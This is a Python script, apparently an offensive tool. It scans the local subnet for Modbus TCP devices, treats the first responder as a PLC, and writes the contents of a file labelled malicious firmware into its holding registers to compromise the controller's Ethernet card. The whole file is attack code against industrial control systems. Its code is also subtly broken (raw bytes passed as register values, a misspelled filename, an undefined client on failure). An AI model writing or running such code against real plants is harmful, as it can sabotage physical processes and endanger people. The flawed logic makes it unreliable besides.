from pymodbus.client.sync import ModbusTcpClient
import socket

# Function to find the PLC's IP address
def find_plc_ip():
    ip_address = socket.gethostbyname(socket.gethostname())
    subnet = '.'.join(ip_address.split('.')[:3]) + '.'
    for i in range(1, 255):
        try:
            client = ModbusTcpClient(subnet + str(i))
            connection = client.connect()
            if connection:
                print(f"Found PLC at IP address: {subnet + str(i)}")
                return subnet + str(i)
        except Exception as e:
            pass
    return None

# Function to install malicious firmware on the Ethernet card
def install_malicious_firmware(client, firmware_file):
    try:
        # Read the current firmware version
        current_firmware = client.read_holding_registers(0x1000, 1)
        current_firmware = current_firmware.registers[0]
        
        # Upload the malicious firmware
        with open(firmware_file, 'rb') as file:
            firmware_data = file.read()
        client.write_registers(0x1000, firmware_data)
        print("Malicious firmware installed on Ethernet card")
    except Exception as e:
        print(f"Failed to install malicious firmware on Ethernet card: {e}")

# Function to read a register on the PLC
def read_register(client, register_address):
    try:
        current_value = client.read_holding_registers(register_address, 1)
        current_value = current_value.registers[0]
        print(f"Current register value at address {register_address}: {current_value}")
    except Exception as e:
        print(f"Failed to read register at address {register_address}: {e}")

# Main function
def main():
    plc_ip_address = find_plc_ip()
    if plc_ip_address:
        client = ModbusTcpClient(plc_ip_address)
        connection = client.connect()
        print(f"Connected to PLC: {connection}")
        firmware_file = 'alicious_firmware.bin'  # Replace with the malicious firmware file
        install_malicious_firmware(client, firmware_file)
        register_address = 0x1000
        read_register(client, register_address)
    else:
        print("Failed to find PLC's IP address")
    client.close()

if __name__ == "__main__":
    main()